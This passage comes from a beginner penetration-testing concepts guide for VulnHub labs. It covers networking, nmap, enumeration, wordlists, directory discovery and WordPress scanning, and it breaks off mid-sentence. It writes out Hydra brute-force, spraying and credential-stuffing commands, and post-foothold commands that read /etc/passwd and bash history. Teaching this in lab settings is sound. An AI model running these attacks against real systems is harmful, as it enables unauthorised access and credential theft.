# Concepts — the fundamentals behind every lab in this repository

> **Who this is for.** You are working through a VulnHub machine and you keep
> seeing commands like `nmap -sC -sV -p- -T4`, `gobuster dir -w ...`,
> `hydra -L users.txt -P rockyou.txt`, `find / -perm -u=s -type f`. You can copy
> them and they work — but you do not yet know **why**. This document explains
> the underlying ideas once, properly, so that every lab README can teach the
> *machine* instead of re-teaching the *basics* each time.
>
> **How labs use it.** Each walkthrough links here at the point where a concept
> first appears, e.g.
> [`CONCEPTS.md §5 — What is nmap, and how does it work?`](CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).
> Read the linked section, then go back to the lab. You do not need to read this
> file front-to-back — but if you do, once, you will find every VulnHub box
> suddenly more predictable.
>
> **If you are brand new**, read §2 (networking), §5 (nmap), §6 (enumeration) and
> §7 (wordlists) before your first box. Those four sections explain most of what
> looks like magic in every other lab.

## Contents

1. [The penetration testing lifecycle](#1-the-penetration-testing-lifecycle)
2. [Networking you must know first](#2-networking-you-must-know-first)
3. [What is reconnaissance?](#3-what-is-reconnaissance)
4. [Host discovery — who is out there?](#4-host-discovery--who-is-out-there)
5. [What is nmap, and how does it work?](#5-what-is-nmap-and-how-does-it-work)
6. [What is enumeration?](#6-what-is-enumeration)
7. [What is a wordlist?](#7-what-is-a-wordlist)
8. [Content discovery — finding hidden URLs](#8-content-discovery--finding-hidden-urls)
9. [Enumerating specific services](#9-enumerating-specific-services)
10. [Encoding vs hashing vs encryption](#10-encoding-vs-hashing-vs-encryption)
11. [Finding and using exploits](#11-finding-and-using-exploits)
12. [Shells — bind, reverse, and TTYs](#12-shells--bind-reverse-and-ttys)
13. [Web application attack classes](#13-web-application-attack-classes)
14. [Password cracking](#14-password-cracking)
15. [Linux privilege escalation](#15-linux-privilege-escalation)
16. [Post-exploitation and lateral movement](#16-post-exploitation-and-lateral-movement)
17. [Flags, proofs and CTF conventions](#17-flags-proofs-and-ctf-conventions)
18. [Reporting, cleanup and ethics](#18-reporting-cleanup-and-ethics)

---

## 1. The penetration testing lifecycle

A penetration test is not "run tools until something breaks." It is a repeatable
process, and every lab in this repository follows the same shape. Learn the shape
and you will never stare at a blank terminal wondering what to do next.

| Phase | Question it answers | Typical tools |
| --- | --- | --- |
| **1. Reconnaissance** | *What exists?* Who owns this range, what hosts are alive, what is the organisation's footprint? | `netdiscover`, `arp-scan`, `nmap`, OSINT |
| **2. Enumeration** | *What is running, and what can I ask it?* Open ports, service versions, usernames, directories, shares, databases. | `nmap -sV`, `gobuster`, `wpscan`, `enum4linux`, `showmount` |
| **3. Vulnerability identification** | *Which of those things is known to be broken?* Matching versions to CVEs and public exploits. | `searchsploit`, `wpscan`, `nikto`, `nmap --script vuln` |
| **4. Exploitation / foothold** | *Can I execute my own code?* Getting the first shell — usually as a low-privileged service account. | Metasploit, manual PoCs, `curl`, web shells |
| **5. Privilege escalation** | *Can I become an administrator?* Moving from `www-data` to `root`, or `user` to `Administrator`. | `linpeas`, `sudo -l`, SUID hunts, kernel exploits |
| **6. Post-exploitation** | *What else can I reach?* Pivoting to other hosts, dumping secrets, persistence, reading data. | `ss`, `chisel`, credential harvesting |
| **7. Reporting** | *Can I explain it so it gets fixed?* This is the actual deliverable of a professional test. | write-ups, CVSS scores, remediation |

> **The most common beginner mistake is jumping from phase 1 to phase 4.** You see
> a web server and immediately fire Metasploit at it. That fails, and you have no
> idea why, because you never learned what was actually there. **Enumeration is
> the phase that makes exploitation predictable.** Almost every VulnHub author
> writes some variation of "ENUMERATION IS THE KEY" — they are not being cute,
> they are telling you which phase you are skipping.

### Rules of engagement

In a real test you have a signed **scope**: exactly which IP ranges, domains and
applications you may touch, during which hours, with which techniques. Testing
outside scope is a crime in most jurisdictions (in the UK, the Computer Misuse
Act 1990; in the US, the CFAA). VulnHub machines exist so that you can practise
*inside* a scope you own — a VM on an isolated network on your own hardware.

See [`LAB-SETUP.md`](LAB-SETUP.md) for how to build that isolated network.

---

## 2. Networking you must know first

You cannot interpret an `nmap` scan without understanding what a port scan is
physically doing.

### 2.1 IP addresses and subnets

An **IP address** identifies a host on a network. In a lab you will almost always
see private IPv4 ranges, which are reserved for internal use and never routed on
the public internet:

| Range | Typical use in labs |
| --- | --- |
| `192.168.56.0/24` | **VirtualBox host-only** — the most common VulnHub setup |
| `192.168.x.0/24` | Home routers, VMware NAT |
| `10.0.2.0/24` | VirtualBox/VMware NAT (your VM's route to the internet) |
| `172.16.0.0/12` | Docker, larger corporate networks |

The **`/24`** suffix is CIDR notation. It means the first 24 bits are the
*network* part and the remaining 8 bits are the *host* part:

- `/24` → netmask `255.255.255.0` → 256 addresses (`x.x.x.0` – `x.x.x.255`)
- `/16` → netmask `255.255.0.0` → 65,536 addresses
- `/32` → a single host

**Why this matters:** your attacker machine and the target must be on the *same*
subnet to talk at layer 2. If Kali is `192.168.56.10/24` and the target is
`192.168.1.50/24`, nothing will work and no amount of tooling will fix it — you
have a networking configuration problem, not a hacking problem.

Find your own address:

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
```

`-br` means *brief*. Read it as: `eth0` is my lab network (host-only), `eth1` is
my internet connection (NAT). The target will be on `eth0`'s subnet.

### 2.2 MAC addresses and ARP

A **MAC address** is a hardware identifier burned into a network card, e.g.
`08:00:27:4e:66:a1`. IP addresses are logical and can change; MAC addresses are
physical and (mostly) do not.

**ARP** (Address Resolution Protocol) answers the question *"which MAC address
owns this IP address?"* It operates at layer 2, directly on the wire, and
**cannot be blocked by a host firewall** — which is why ARP scanning is the most
reliable way to find live hosts on a local network.

```bash
sudo arp-scan --interface=eth0 --localnet
```

> **Practical tip:** the MAC address's first three octets identify the
> manufacturer. `08:00:27` is **Oracle VirtualBox**; `00:0c:29` and `00:50:56`
> are **VMware**; `00:15:5d` is **Microsoft Hyper-V**. If you see several live
> hosts and you are not sure which is your target, the vendor prefix tells you
> which ones are VMs. Always confirm the target's MAC against your hypervisor's
> settings — attacking the wrong host is the classic beginner error.

### 2.3 Ports and protocols

A **port** is a number from 0–65535 that identifies *which program* on a host
should receive a packet. IP gets you to the machine; the port gets you to the
service.

- **Ports 0–1023** are *well-known* / privileged. Only root can bind them.
  Examples: 22 SSH, 80 HTTP, 443 HTTPS, 445 SMB.
- **Ports 1024–49151** are *registered*. Examples: 3306 MySQL, 8080 HTTP-alt,
  8000 HTTP-alt.
- **Ports 49152–65535** are *ephemeral* — assigned temporarily to outbound
  connections. When your shell connects back to your Kali box, Kali's port 4444
  is the listener and the target picks a random ephemeral port as its source.

**TCP vs UDP** — this distinction causes more missed findings than anything else
in beginner scanning:

| | TCP | UDP |
| --- | --- | --- |
| Connection | **Connection-oriented** — a handshake establishes the session first | **Connectionless** — fire and forget |
| Reliability | Guaranteed delivery, ordering, retransmission | No guarantees at all |
| Handshake | **Three-way:** SYN → SYN-ACK → ACK | None |
| Closed port replies | **RST** packet — a definite "no" | Usually an **ICMP port-unreachable** |
| Used by | HTTP, SSH, FTP, SMB, MySQL | DNS, **TFTP**, SNMP, NTP, NetBIOS |
| Scan speed | Fast, unambiguous | Slow, ambiguous |

### 2.4 The TCP three-way handshake — the basis of all port scanning

This is the single most important mechanism to understand, because **every TCP
scan type is a variation on how much of this handshake you complete**:

```text
   Attacker                              Target
      |                                     |
      |--------- SYN (seq=x) -------------->|   "Can I talk to port 80?"
      |                                     |
      |<------ SYN-ACK (seq=y, ack=x+1) ----|   "Yes, port 80 is open."
      |                                     |
      |--------- ACK (ack=y+1) ------------>|   "Great, connection established."
      |                                     |
      |=========== data flows =============>|
```

If the port is **closed**, the target replies with **RST** instead of SYN-ACK.
If a **firewall** drops the packet, you get *no reply at all* — which `nmap`
reports as `filtered`.

So there are three observable outcomes, and they map directly onto the words you
see in every scan:

| Target's reply | nmap says | Meaning |
| --- | --- | --- |
| SYN-ACK | **`open`** | A program is listening |
| RST | **`closed`** | The host is up but nothing is listening there |
| *(nothing)* / ICMP unreachable | **`filtered`** | A firewall dropped it |
| SYN-ACK *or* RST depending on probe | **`open\|filtered`** | Ambiguous — typical for UDP |

### 2.5 Ports you will meet constantly

| Port | Service | Why it matters in labs |
| --- | --- | --- |
| 21 | **FTP** | Anonymous login (`anonymous`/blank), cleartext creds, file upload/download |
| 22 | **SSH** | Brute force, key reuse, the most common way to *keep* access |
| 23 | Telnet | Cleartext everything; sometimes hidden banners |
| 25/587 | **SMTP** | `VRFY`/`EXPN` user enumeration, sometimes a shell via CVE |
| 53 | DNS (TCP **and UDP**) | Zone transfers (`AXFR`), subdomain enumeration |
| **69** | **TFTP (UDP)** | **No authentication whatsoever** — free file reads |
| 80/443 | **HTTP/HTTPS** | The main attack surface on most boxes |
| 110/143 | POP3/IMAP | Reading mail after credential theft |
| 111 | **rpcbind** | The gateway to NFS enumeration |
| 135/139/445 | **SMB/NetBIOS** | Null sessions, share enumeration, MS17-010 |
| 161 | **SNMP (UDP)** | Community string `public` leaks the whole system |
| 3306 | **MySQL** | Often loopback-only; empty root passwords |
| 3389 | RDP | Windows remote desktop |
| 2049 | **NFS** | Exported directories; `no_root_squash` → root |
| 5432 | PostgreSQL | Same class of findings as MySQL |
| 5900 | VNC | Weak/absent auth |
| 6379 | Redis | Frequently unauthenticated → write SSH keys |
| 8000/8080/8888 | HTTP-alt | Dev servers, admin panels, second apps |
| 9200 | Elasticsearch | Unauthenticated data access |
| 10000 | **Webmin** | Admin panel; CVE-2019-15107 RCE |
| 20000 | **Usermin** | User-facing Webmin |
| 27017 | MongoDB | Frequently unauthenticated |

> **Memorise the shape, not the list.** When you see a port you do not recognise,
> the workflow is always: (1) what does `nmap -sV` call it, (2) search
> `"<service name> default credentials"`, (3) search
> `"<service name> <version> exploit"`.

---

## 3. What is reconnaissance?

**Reconnaissance** ("recon") is the phase where you find out *what exists* before
you try to break into anything. It is deliberately broad and shallow: you are
building a map, not attacking a target.

The word comes from military observation — going out to look at the terrain
before committing troops. In security it means exactly the same thing.

### 3.1 Two kinds

| | **Passive** recon | **Active** recon |
| --- | --- | --- |
| Does the target see you? | **No** — you never send it a packet | **Yes** — every probe is logged |
| Sources | Search engines, DNS records, WHOIS, `crt.sh` certificate transparency, Google/Bing dorks, Shodan, GitHub, LinkedIn, the Wayback Machine | `nmap`, `gobuster`, `nikto`, `wpscan`, `hydra` |
| Risk of detection | None | High — IDS/IPS and log review will see it |
| Where VulnHub sits | Barely relevant | **This is your whole job** |

On VulnHub you have no OSINT to do — there is no company website, no LinkedIn, no
certificate history. So "reconnaissance" in a lab almost always means **active
network reconnaissance**: find the IP, find the ports.

> **On a real engagement passive recon is disproportionately valuable.** A
> company's own documentation, job postings ("we use Jenkins 2.200"), GitHub
> repositories, and SSL certificate lists will hand you the exact versions and
> hostnames you need. Practise it even though labs do not reward it.

### 3.2 What "finding the target" actually means

In a lab the target's IP is usually assigned by **DHCP** and can change every
boot. So step one is always host discovery:

```bash
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
 192.168.56.10   08:00:27:4e:66:a1      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

**How to read this.** `.1` is the gateway (VirtualBox's host-side adapter).
`.10` is you — recognise your own MAC. That leaves **`.101` as the target.**

> Some VMs do not respond to ARP at all, or boot slowly. If `netdiscover` finds
> nothing: check the VM's network adapter is set to *host-only* (not NAT), wait
> 30 seconds for boot, and try `sudo nmap -sn 192.168.56.0/24` as a second
> opinion.

### 3.3 A habit worth forming

Keep a **notes file** per machine from the very first command:

```bash
mkdir ~/vulnhub/raven-1 && cd ~/vulnhub/raven-1
echo "target=192.168.56.101  attacker=192.168.56.10  date=$(date -I)" > notes.txt
```

Every `nmap` run should write to a file (`-oA scans/name`), every credential you
find should go into `creds.txt`, every TODO into `todo.txt`. Boxes that take more
than an hour are lost without this. Professionals use tools like CherryTree,
Obsidian or Notion; a flat text file is genuinely enough.

---

## 4. Host discovery — who is out there?

Several techniques, in rough order of reliability on a local lab network:

```bash
# 1. ARP — most reliable on a local subnet, unblockable by host firewalls
sudo arp-scan --interface=eth0 --localnet
sudo netdiscover -i eth0 -r 192.168.56.0/24

# 2. ICMP ping sweep — often blocked, so a missing reply proves nothing
sudo nmap -sn -PE 192.168.56.0/24

# 3. TCP ping to a likely-open port — works through ICMP-blocking firewalls
sudo nmap -sn -PS80,443,22 192.168.56.0/24

# 4. Just scan everything — slowest, most thorough
sudo nmap -Pn -p- 192.168.56.0/24
```

> `-sn` means "**s**can only — do **n**o port scan" (host discovery). `-Pn`
> means "**P**ing **n**o — skip host discovery and scan the port anyway", which
> is what you need when a host blocks ping but is definitely alive.

---

## 5. What is nmap, and how does it work?

**`nmap`** ("Network MAPper") is the standard tool for discovering hosts and the
services they run. It works by **sending deliberately crafted packets and
classifying the responses** — it does not magic information out of the network.
Once you understand that, every flag becomes predictable.

### 5.1 Scan types — how much of the handshake you complete

| Flag | Name | What it sends | What it learns | Needs root? |
| --- | --- | --- | --- | --- |
| `-sS` | **SYN / "half-open"** scan | A bare `SYN`. If SYN-ACK comes back, it sends **RST** to tear down instead of completing | `open` vs `closed`, **without** establishing a session — so the service never logs a connection | **Yes** |
| `-sT` | **TCP connect** scan | Completes the full three-way handshake via the OS `connect()` call | Same result, but **the application sees a real connection** and logs it | No |
| `-sU` | **UDP** scan | An empty (or protocol-specific) UDP datagram | No reply + ICMP unreachable = `closed`; no reply at all = `open\|filtered`; a real reply = `open` | Yes |
| `-sA` | ACK scan | A bare `ACK` | Whether a **stateful firewall** is in the path (unfiltered vs filtered) — does *not* find open ports | Yes |
| `-sN` / `-sF` / `-sX` | Null / FIN / Xmas | Packets with no flags / FIN only / FIN+PSH+URG | Sneak past naive firewalls; unreliable against Windows | Yes |
| `-sn` | Ping scan | ARP/ICMP/TCP probes | Live hosts only | Sometimes |

> **Why `-sS` is the default when you are root.** It is faster, and because the
> handshake never completes the target's *application* never sees a login — only
> the kernel does. That makes it stealthier against application logs (though
> modern IDS detect it trivially). When you are not root, `nmap` silently falls
> back to `-sT`, which is why the same command behaves differently with and
> without `sudo`.

**Xmas scan** is a good example of how weird this gets: it sends a packet with
FIN, PSH and URG all set — "lit up like a Christmas tree". RFC 793 says a closed
port must reply RST and an open port must not reply at all, so the *absence* of a
reply implies open. It works on some stacks and is useless on Windows, which
replies RST regardless.

### 5.2 Version detection — `-sV`

Once `nmap` knows a port is open it can try to identify **what** is listening.
It does this by opening a connection and:

1. Reading any **banner** the service volunteers (FTP and SMTP send one
   immediately on connect — `220 ProFTPD 1.3.5`).
2. Sending a sequence of **probes** from its `nmap-service-probes` database and
   comparing responses against ~10,000 fingerprints.
3. Computing a **confidence** level.

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

> **Version detection is the pivot for everything else.** `Apache 2.4.29` tells
> you the OS is probably **Ubuntu 18.04**; `OpenSSH 7.6p1` confirms it; and
> together they tell you which kernel exploits are plausible. **Never skip `-sV`.**
> The cost is a few extra seconds; the benefit is that `searchsploit` becomes
> usable.
>
> `-sV --version-intensity 9` sends every probe (slower, more accurate).
> `-sV --version-light` sends only the most likely ones.

### 5.3 OS detection — `-O`

`nmap` fingerprints the **TCP/IP stack itself** by sending malformed and
edge-case packets and observing how the OS responds: initial TCP sequence number
generation, IP ID sequencing, TCP window sizes, the TTL in replies, whether it
supports unusual flag combinations. Results look like:

```text
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
```

Note the **range** — OS detection is probabilistic, not certain. Trust it as a
hint, never as fact. Confirm with `uname -a` once you have a shell.

### 5.4 Scripts — `-sC` and `--script`

The **NSE** (Nmap Scripting Engine) is a Lua interpreter embedded in nmap with
hundreds of scripts in `/usr/share/nmap/scripts/`. This is what turns nmap from a
port scanner into a light vulnerability scanner.

```bash
# Run the "default" category — safe, informative
sudo nmap -sC -sV 192.168.56.101

# One specific script with arguments
sudo nmap -p 445 --script smb-enum-shares,smb-enum-users --script-args smbusername=guest 192.168.56.101

# A whole category
sudo nmap -p 80 --script http-enum,http-title,http-headers 192.168.56.101

# Discover what exists
ls /usr/share/nmap/scripts/ | grep -i nfs
nmap --script-help nfs-showmount
```

Common categories: `default`, `safe`, `intrusive`, `vuln`, `exploit`, `auth`,
`brute`, `discovery`.

> **Scripts in the `vuln` and `exploit` categories can crash services.** On a lab
> VM you can reboot; on a real engagement you need written permission first.

### 5.5 Port selection

```bash
-p-              # all 65535 TCP ports
-p 22,80,443     # a specific list
-p 1-1024        # a range
-p U:53,T:80     # UDP 53 and TCP 80 in one run
--top-ports 1000 # the 1000 most common (nmap's default is 1000)
-F               # "fast" — the 100 most common
```

> **Always use `-p-` on labs.** The interesting service is frequently on an
> unusual port — `:8080`, `:666`, `:31337`, `:10000`. `-p-` costs a couple of
> minutes and prevents the most common way beginners get stuck. If `-p-` is too
> slow, raise the rate: `--min-rate 1000 -T4`.

### 5.6 Timing and rate

`-T0` through `-T5` control how aggressive nmap is about parallelism, timeouts
and retries. `-T0` (paranoid) serialises everything and waits 5 minutes between
probes; `-T5` (insane) is as fast as possible and produces false negatives.

**`-T4` is the right answer for labs.** `-T5` frequently misses ports because it
gives up on slow replies too early — a *false negative*, which is worse than
slow.

Fine-grained controls: `--min-rate 1000` (packets/sec floor), `--max-retries 2`,
`--host-timeout 5m`.

### 5.7 Output

```bash
-oN file.txt   # normal, human-readable
-oX file.xml   # XML — machine-readable, importable into tools
-oG file.gnmap # "greppable" — one line per host, easy to awk
-oA basename   # ALL THREE at once (basename.nmap, .xml, .gnmap)
-v / -vv       # verbose — show progress and discovered ports as they appear
--reason       # WHY nmap concluded each port state (which packet proved it)
--open         # suppress closed/filtered from the output
```

> **`-oA` is the professional habit.** You will want to re-read the scan hours
> later, grep it, or import it. Rescanning is slower and may produce different
> results. Use `-oA scans/name` and keep the files.
>
> **`--reason` is the best learning flag in nmap.** It shows you the actual
> evidence behind each conclusion — `syn-ack` vs `reset` vs `no-response` — which
> is exactly the handshake behaviour from §2.4 made visible.

### 5.8 Reading output properly

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 10:14 EEST
Nmap scan report for raven.local (192.168.56.101)
Host is up (0.00042s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
111/tcp  open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 34.18 seconds
```

Read it in this order:

1. **`Not shown: 65532 closed tcp ports (conn-refused)`** — the line everyone
   skips and the most information-dense line in the output. `65535 - 65532 = 3`
   ports are interesting. `(conn-refused)` tells you the *reason*: RST replies,
   i.e. the host is up and answering, not firewalled. If it said
   `(no-response)` you would suspect filtering.
2. **`PORT / STATE / SERVICE / VERSION`** — the actual findings. Note `STATE`
   precisely: `open` is exploitable; `open|filtered` means *unproven*.
3. **`Service Info: OS: Linux`** — the OS fingerprint, feeding your kernel-exploit
   research.
4. **`MAC Address`** — confirms you are attacking a VM and which hypervisor.
5. **`scanned in 34.18 seconds`** — sanity check. A `-p-` scan finishing in 2 s
   probably hit a firewall or the wrong IP.

---

## 6. What is enumeration?

**Enumeration** is the phase where you interrogate the services you found, to
extract *specific, actionable detail*: usernames, directory paths, share names,
database tables, software versions, internal hostnames.

The distinction from scanning:

| | Scanning | Enumeration |
| --- | --- | --- |
| Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
| Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
| Example | `nmap -p- -sV` → "port 80 open, Apache 2.4.29" | `wpscan -e u` → "users: michael, steven" |

**Enumeration produces the nouns that exploitation needs.** You cannot brute
force a login without a username. You cannot exploit a file upload without
knowing the upload path. You cannot crack a hash you have not found. Every
successful foothold traces back to an enumerated fact.

### 6.1 The universal enumeration reflexes

Whatever the service, run these:

```bash
# 1. What does the default page say? Read it. Then read the SOURCE.
curl -s http://target/ | less
curl -s http://target/ | grep -oE '<!--.*?-->'

# 2. What do the response headers leak?
curl -sI http://target/

# 3. robots.txt, sitemap.xml, .well-known/, favicon hash
curl -s http://target/robots.txt

# 4. Content discovery (see §8)
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip

# 5. Everything the tool suite already knows
nikto -h http://target/
whatweb -a 3 http://target/
```

> **Read the default page.** Students skip straight to tooling and miss a sentence
> of plain English that says *"our admin panel is at /portal and the default
> password is still set"*. Authors put hints in the page body, in HTML comments,
> in image filenames, in EXIF metadata, and in HTTP headers. Look at all of them
> before you start brute-forcing.

### 6.2 Useful generic post-enumeration commands

Once you have any shell, enumeration continues *inward*:

```bash
id; whoami; hostname; uname -a; cat /etc/os-release   # who/where am I
sudo -l                                                # what may I run as root?
ss -tulnp                                              # what services are listening LOCALLY?
cat /etc/passwd | grep -E '/bin/(ba)?sh$'              # which users can log in?
find / -perm -u=s -type f 2>/dev/null                  # SUID binaries
cat /etc/crontab; ls -la /etc/cron.*                   # scheduled jobs
ls -la /opt /srv /var/backups /home/*/                 # non-standard locations
history; cat ~/.bash_history                           # what did the last user do?
```

`ss -tulnp` is the one people forget: services bound to `127.0.0.1` are invisible
to an external `nmap` scan, and they are frequently the most vulnerable thing on
the box.

---

## 7. What is a wordlist?

A **wordlist** is a plain text file with one candidate per line — passwords,
usernames, directory names, or subdomains. Tools read it and try each entry in
turn.

That is the whole concept. Its power comes from a simple empirical fact: **human
behaviour is not random.** Passwords cluster; web directories cluster; people
reuse. A well-built list of 10,000 entries beats a random-strings generator of
10,000,000.

### 7.1 Where wordlists come from

| List | Size | Origin | Use |
| --- | --- | --- | --- |
| **`rockyou.txt`** | 14,344,392 | The 2009 RockYou breach leaked 32M *plaintext* passwords | The default password list. Ordered by observed frequency, so the top of the file is the most valuable. |
| **`dirb/common.txt`** | 4,612 | Hand-curated common paths | Fast first-pass directory scan |
| **`dirb/big.txt`** | 204,669 | Larger path list | Second pass; finds things `common` misses |
| **`directory-list-2.3-medium.txt`** | 220,547 | DirBuster project, crawled from real sites | Thorough content discovery |
| **`SecLists`** | huge | Daniel Miessler's curated collection | The professional standard: passwords, usernames, URLs, fuzzing payloads, discovery lists by technology |
| **`/usr/share/wordlists/fasttrack.txt`** | 222 | Most common real-world passwords | Very fast first attempt |

On Kali these live under `/usr/share/wordlists/`. `rockyou.txt` ships **gzipped**:

```bash
sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
wc -l rockyou.txt
```

```text
14344392 rockyou.txt
```

### 7.2 Building a *targeted* wordlist

This is the skill that separates people who crack things from people who wait.
Generic lists fail against themed boxes; **the target's own vocabulary succeeds.**

```bash
# cewl — crawl a site and harvest its words
cewl -d 2 -m 5 -w custom.txt http://target/

# include digits and email addresses
cewl -d 3 -m 4 --with-numbers -e -w custom.txt http://target/

# cupp — build a list from a person's details (name, birthday, pet, partner)
python3 cupp.py -i        # interactive

# crunch — generate from a pattern
crunch 6 6 -t for%%% -o crunch.txt      # 'for' + 3 digits = 1,000,000 lines
crunch 4 4 0123456789abcdef -o hex4.txt # all 4-char hex strings

# Combine and de-duplicate
cat rockyou-top1000.txt custom.txt | sort -u > combined.txt
```

> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit
> their theme and then put theme words all over the website. `cewl` harvests
> exactly that vocabulary. If a box is called "Narak" and its homepage is full of
> Sanskrit words about hell, the password is very likely one of them — and very
> unlikely to be in `rockyou.txt`.

### 7.3 Wordlist vs brute force vs spraying vs stuffing

These get conflated constantly. They are different attacks with different
detection profiles:

| Attack | What it does | Detection risk | When to use |
| --- | --- | --- | --- |
| **Wordlist attack** | Many passwords against **one** account | Medium | You have a strong username |
| **Brute force** | Every character combination | Very high, very slow | Only for short/simple known patterns |
| **Password spraying** | **One** password against **many** accounts | Low per-account | Avoids lockouts; try `Password1` against all 500 users |
| **Credential stuffing** | Real leaked *username:password pairs* against many accounts | Medium | You have breach data; exploits reuse |

Spraying is what professionals do first, precisely because it stays **under
per-account lockout thresholds**. Ten accounts × one password looks like ten
normal logins; one account × ten passwords looks like an attack.

### 7.4 Recognising the shape of the tool call

```bash
hydra -l USER -P WORDLIST -f -V ssh://TARGET          # one user, many passwords
hydra -L USERS -p PASS -f -V ssh://TARGET             # many users, one password
hydra -L USERS -P WORDLIST -f -V ssh://TARGET         # cartesian product — SLOW
hydra -C userpass.txt -f -V ssh://TARGET              # colon-separated pairs (stuffing)
```

`-f` stops at the first success. `-V` shows each attempt so you can see it
working. `-l`/`-p` are single values; `-L`/`-P` are files. `-C` takes a file of
`user:pass` lines.

> **Choose the right Hydra service module.** `ssh`, `ftp`, `http-get` (Basic
> Auth), `http-post-form` (HTML login forms), `mysql`, `smb`, `rdp`, `vnc`,
> `smtp`, `pop3`, `snmp`, `rdp`. Using `http-post-form` against a Basic Auth
> endpoint will never work — there is no HTML form to parse. This is the single
> most common Hydra mistake.

---

## 8. Content discovery — finding hidden URLs

Web servers happily serve anything they have. Content discovery means **guessing
paths** and keeping the ones that exist.

### 8.1 How it works mechanically

The tool requests `/admin`, `/backup`, `/config.php`, … and classifies each
response. There is no cleverness — it is a dictionary attack against the URL
space. What makes it effective is (a) a good wordlist and (b) reading status
codes correctly.

### 8.2 HTTP status codes you must know

| Code | Meaning | What it tells you |
| --- | --- | --- |
| **200** OK | Success | The resource exists and you can read it |
| **201** Created | A `PUT` succeeded | **You can write files to this server** |
| **204** No Content | Success, empty body | Common on `DELETE` |
| **301** Moved Permanently | Redirect, new URL in `Location` | Usually a directory — needs a trailing `/` |
| **302** Found | Temporary redirect | On a login endpoint, **302 to `/admin/` = success**; 200 = failure |
| **401** Unauthorized | *Authentication* required | Needs credentials — look at `WWW-Authenticate` |
| **403** Forbidden | *Authorization* denied | **It exists.** You just may not read it. Very interesting. |
| **404** Not Found | Does not exist | Baseline — this is what most guesses return |
| **405** Method Not Allowed | Wrong verb | The path exists; try `PUT`, `POST`, `OPTIONS` |
| **500** Internal Server Error | Server-side crash | **Your input broke something** — often means injection |

> **`401` vs `403` is the distinction that matters most.** `401` = "I don't know
> who you are" (authenticate). `403` = "I know who you are and you may not"
> (authorise). A `403` proves the resource exists, which is itself an information
> leak. And `401` tells you the *scheme* — read the `WWW-Authenticate` header.

### 8.3 Tools

```bash
# gobuster — fast, threaded, the modern default
gobuster dir -u http://target/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,zip -t 50 --no-error -o dirs.txt

# dirb — older, slower, but its -X extension flag is idiomatic
dirb http://target/ -X .php,.txt,.zip

# ffuf — fastest, most flexible, supports fuzzing parameters too
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302,403
ffuf -u http://target/page.php?id=FUZZ -w wordlist.txt -fs 1234   # filter by size

# nikto — not a dirbuster; a vulnerability scanner with 6,700+ checks
nikto -h http://target/
```

> **The `-x` / `-X` extension flag is the difference between finding nothing and
> finding everything.** `dirb` requesting `/secret` gets a 404; requesting
> `/secret.txt` gets a 200. **If your first content-discovery scan comes back
> empty, the next thing to change is the extension list, not the wordlist.**
> Try `-x php,txt,html,bak,old,zip,conf,log,inc,swp`.

### 8.4 Where to look manually, always

```text
/robots.txt          /sitemap.xml       /.git/HEAD         /.env
/admin               /administrator     /wp-login.php      /phpmyadmin
/backup              /backups           /.htaccess         /.htpasswd
/server-status       /info.php          /phpinfo.php       /test.php
/favicon.ico         /crossdomain.xml   /.well-known/      /api/
/cgi-bin/            /uploads           /images            /.svn/entries
```

`/.git/HEAD` returning a 200 is one of the highest-value findings on the web:
you can reconstruct the entire repository, including deleted secrets, with
`git-dumper`.

---

## 9. Enumerating specific services

### 9.1 HTTP

```bash
curl -sI http://target/                       # headers: Server, X-Powered-By, Set-Cookie
whatweb -a 3 http://target/                   # CMS/framework fingerprint
nikto -h http://target/                       # 6,700 generic checks
gobuster dir -u http://target/ -w list -x php # content discovery
```

Always: **View Source** (`Ctrl+U`) for comments, and check the `Set-Cookie`
header — framework cookies identify technology instantly (`PHPSESSID` → PHP,
`JSESSIONID` → Java, `laravel_session` → Laravel, `csrftoken`+`sessionid` →
Django, `ASP.NET_SessionId` → .NET, `connect.sid` → Express).

### 9.2 WordPress — `wpscan`

```bash
wpscan --url http://target/wordpress -e u,p,t,vp --api-token "$TOKEN"
```

| `-e` value | Enumerates |
| --- | --- |
| `u` | **Users** — via `/?author=1..N`, RSS feeds, the REST API |
| `p` | **Plugins** — the most common compromise vector |
| `t` | Themes |
| `vp` | Only *vulnerable* plugins |
| `vt` | Only *vulnerable* themes |
| `cb` | Config backups (`wp-config.php.bak` — a jackpot) |
| `dbe` | Database exports |
| `m` | Media files |

`wpscan` correlates detected versions against the WPScan vulnerability database.
A free API token lifts the per-day limit; without one you still get names and
versions.

> **Why user enumeration matters:** WordPress leaks authors through
> `/?author=1`, which 301-redirects to `/author/michael/`. That gives you half of
